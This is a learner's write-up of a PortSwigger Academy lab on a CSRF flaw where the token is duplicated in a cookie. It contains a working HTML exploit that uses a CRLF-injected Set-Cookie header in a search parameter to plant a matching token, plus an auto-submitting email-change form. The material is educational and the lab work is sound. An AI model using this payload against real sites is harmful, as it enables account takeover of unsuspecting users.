## Lab 06: CSRF Where Token Is Duplicated in Cookie

### Platform

PortSwigger Web Security Academy

### Difficulty

Practitioner

### Topic

Cross-Site Request Forgery / Double Submit Cookie Weakness

### Lab Status

Solved

### Objective

Exploit a CSRF vulnerability where the CSRF token is duplicated in a cookie and can be controlled by the attacker.

### Simple Explanation

The application uses a weak CSRF protection method called double submit cookie.

It checks whether the `csrf` value in the request body matches the `csrf` cookie.

The problem is that the attacker can plant their own `csrf` cookie in the victim's browser and submit the same value in the form.

### Vulnerability Description

The email change function requires:

```text
email
csrf
```

The browser also sends a cookie:

```text
csrf
```

The server only checks whether both values match.

It does not verify that the CSRF token was generated securely or tied to the user's session.

### Exploit Used

```html
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="csrf-duplicate-test@test.com">
    <input type="hidden" name="csrf" value="fake">
</form>

<img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None" onerror="document.forms[0].submit();">
```

### Exploit Explanation

The image request plants this cookie in the victim's browser:

```text
csrf=fake
```

Then the form submits a POST request with the same value:

```text
csrf=fake
```

Because the cookie value and form value match, the application accepts the request.

### Steps Taken

Opened the Exploit Server.

Created an auto-submitting form to send a POST request to:

```text
/my-account/change-email
```

Added a hidden `email` field with a new email address.

Added a hidden `csrf` field with the value:

```text
fake
```

Used the image request to set the victim's `csrf` cookie to the same value.

Stored the exploit.

Delivered the exploit to the victim.

The lab was solved.

### Result

The victim's email was changed because the application accepted the attacker-controlled CSRF value.

### What I Learned

I learned that double submit cookie protection is weak if the attacker can control the CSRF cookie.

### Security Impact

An attacker could perform sensitive actions if CSRF validation only compares matching cookie and form values.

### Mitigation

Bind CSRF tokens to the user's session and prevent attackers from setting trusted CSRF cookies.

### Tools Used

PortSwigger Web Security Academy

Exploit Server

Web Browser
